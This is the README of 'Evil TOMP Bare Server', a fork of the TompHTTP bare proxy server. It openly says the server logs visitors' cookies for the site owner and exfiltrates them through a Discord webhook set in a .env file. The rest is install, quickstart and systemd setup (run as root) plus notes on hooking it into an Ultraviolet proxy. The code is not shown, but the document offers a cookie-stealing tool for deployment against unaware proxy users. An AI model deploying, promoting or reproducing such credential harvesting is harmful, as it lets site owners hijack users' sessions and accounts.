# Evil TOMP Bare Server

This repository implements the TompHTTP bare server. See the specification [here](https://github.com/tomphttp/specifications/blob/master/BareServer.md).

This also logs all your cookies for the site owner.

## Extra Setup

Make a .env file that looks like this:

```
WEBHOOK="https://discord.com/api/webhooks/10/T0k3n"
```

##  

## Upgrading

A guide for updating from v1 to v2 can be found [here](./docs/V2-UPGRADE-GUIDE.md).

## Usage

We provide a command-line interface for creating a server.

For more features, specify the `--help` option when running the CLI.

## Quickstart

### Program

1. Install Bare Server Node globally

```sh
npm install --global bare-server-evil
```

2. Start the server

```sh
npx bare-server-evil
```

Optionally start the server localhost:8080:

```sh
npx bare-server-evil --port 8008 --host localhost
```

### Systemd

```system
[Unit]
Description=Evil Bare Server

Wants=network.target
After=syslog.target network-online.target

[Service]
User=root
Group=root
Type=simple
Environment="PORT=8008" # possible put webhook here too?
ExecStart=/path/bare-server-evil/bin.js
KillMode=process
Restart=on-failure
RestartSec=5s

[Install]
WantedBy=multi-user.target
```

## Hook Up With UV

Just tweak the config to point to the new bare server, and (if you want to save on resources) disable the internal bare sever in UV.

## Credit

See [the original](https://github.com/tomphttp/bare-server-node/).

